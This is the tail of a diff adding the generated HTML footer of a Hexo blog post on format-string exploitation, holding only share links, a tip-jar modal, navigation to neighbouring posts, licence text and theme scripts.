+    最后更新时间：<time datetime="2020-08-03T02:52:12.930Z" itemprop="dateUpdated">2020-08-03 10:52:12</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/03/21/aedgn4/&title=《PWN入门（格式化字符串漏洞）》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/03/21/aedgn4/&title=《PWN入门（格式化字符串漏洞）》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/03/21/aedgn4/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PWN入门（格式化字符串漏洞）》 — yichen's blog&url=https://yichen115.github.io/2020/03/21/aedgn4/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/03/21/aedgn4/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/03/21/xwwcoc/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">DC-2</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/03/16/dpzhhx/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">DC-1</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/03/21/aedgn4/&title=《PWN入门（格式化字符串漏洞）》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/03/21/aedgn4/&title=《PWN入门（格式化字符串漏洞）》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/03/21/aedgn4/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PWN入门（格式化字符串漏洞）》 — yichen's blog&url=https://yichen115.github.io/2020/03/21/aedgn4/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/03/21/aedgn4/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/03/21/aedgn4/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
